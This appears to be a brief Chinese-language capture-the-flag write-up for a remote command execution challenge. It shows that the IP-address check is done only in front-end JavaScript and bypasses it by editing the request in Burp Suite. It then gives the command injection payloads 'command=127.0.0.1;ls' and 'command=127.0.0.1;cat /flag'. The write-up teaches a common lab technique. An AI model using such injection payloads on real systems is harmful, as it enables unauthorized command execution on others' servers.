#RCE 
发现有输入检查，只能是 ip
但是验证是在前端 js 
```javascript
  function check_ip(){
    let ip = document.getElementById('command').value;
    let re = /^(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)$/;

    if(re.test(ip.trim())){
      return true;
    }
    alert('敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦');
    return false;
  }
```
尝试 burp suite 改包
```text
command=127.0.0.1;ls

command=127.0.0.1;cat /flag
```